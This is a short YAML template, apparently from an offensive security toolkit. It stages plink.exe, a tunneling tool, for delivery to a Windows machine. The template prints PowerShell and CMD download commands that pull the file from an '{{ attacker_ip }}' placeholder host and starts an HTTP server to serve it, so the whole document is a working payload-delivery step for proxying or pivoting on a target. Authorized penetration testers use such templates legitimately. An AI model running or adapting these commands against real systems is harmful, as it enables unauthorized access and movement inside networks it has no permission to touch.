---
metadata:
  filename: "deliver-windows-plink.yaml"
  tags: ["windows", "proxy"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/binaries/plink.exe packstation/outbound; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/plink.exe -Outfile {{ delivery_path_windows }}\plink.exe'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                         -----CMD-----                          '; \
  printf '%s\n' 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/plink.exe -Outfile {{ delivery_path_windows }}\plink.exe'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
